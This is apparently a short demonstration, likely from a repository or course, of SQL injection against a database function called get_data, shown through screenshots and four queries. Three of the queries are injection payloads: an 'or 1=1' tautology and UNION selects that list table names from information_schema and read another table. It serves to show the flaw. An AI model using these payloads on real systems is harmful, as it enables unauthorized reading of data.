![image](https://user-images.githubusercontent.com/26124396/209003690-1df3e9cb-2256-4123-be3f-79c9adc3767c.png)

```sql
select *
from get_data('test');
```  

![image](https://user-images.githubusercontent.com/26124396/209004085-873a65d3-df48-4666-b9c5-1a9ec0a5c54c.png)

```sql
select *
from get_data('any'' or 1=1 -- ');
```  

![image](https://user-images.githubusercontent.com/26124396/209003935-1c2272a5-5bfc-4e09-8334-e265371e773c.png)

```sql
select *
from get_data('1'' union select -1,cast(table_name as varchar),0 from information_schema.tables -- ');
``` 

![image](https://user-images.githubusercontent.com/26124396/209167950-3f4f3e3f-18b5-4da4-a9ad-282800e661cb.png)
 
```sql
select *
from get_data('test'' union select -1, role_name, year from role2university --');
```  

![image](https://user-images.githubusercontent.com/26124396/209006110-9a8d281e-a926-417e-9af6-8601f11e88a4.png)

